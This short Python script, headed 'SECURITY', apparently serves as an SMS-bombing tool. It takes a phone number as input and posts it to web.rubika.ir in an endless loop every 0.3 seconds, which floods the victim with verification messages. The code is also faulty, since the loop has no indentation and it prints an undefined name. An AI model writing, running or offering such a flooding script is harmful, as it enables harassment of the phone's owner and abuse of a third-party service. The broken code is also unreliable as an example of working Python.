# SECURITY 
import requests

import time

target = input("enter number >>> ")

url = "https://web.rubika.ir"

while True:

time.sleep(0.3)

pyload ={"cellphone": target}

u = requests.post(url, data=pyload)

print(ok)
